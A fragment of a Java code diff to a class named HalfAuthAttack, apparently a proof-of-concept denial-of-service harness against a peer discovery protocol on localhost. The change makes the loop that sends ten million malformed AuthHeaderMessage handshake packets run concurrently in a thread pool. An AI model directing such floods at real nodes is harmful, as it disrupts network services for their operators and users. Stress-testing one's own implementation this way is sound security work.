@@ -39,7 +39,7 @@ public class HalfAuthAttack {
     public static final String LOCALHOST = "127.0.0.1";
     private static final Logger logger = LogManager.getLogger();
     private static List<DiscoverySystem> managers = new ArrayList<>();
-    ExecutorService executor = Executors.newFixedThreadPool(4);
+    private static ExecutorService executor = Executors.newFixedThreadPool(2);
 
     public static void main(String[] args) throws Exception {
         if (args.length == 0) {
@@ -62,9 +62,9 @@ public class HalfAuthAttack {
             System.out.println("Got packet, sending malformed AuthHeaderMessage packets");
             AuthHeaderMessagePacket modified = corruptAuthHeader(packet);
             for (int i = 0; i < 10000000; ++i) {
-//                executor.submit(() -> {
+                executor.submit(() -> {
                 client.completeHandshake(modified, server);
-//                });
+                });
                 if (i % 1000 == 0) {
                     System.out.println(i + " requests sent");
                 }
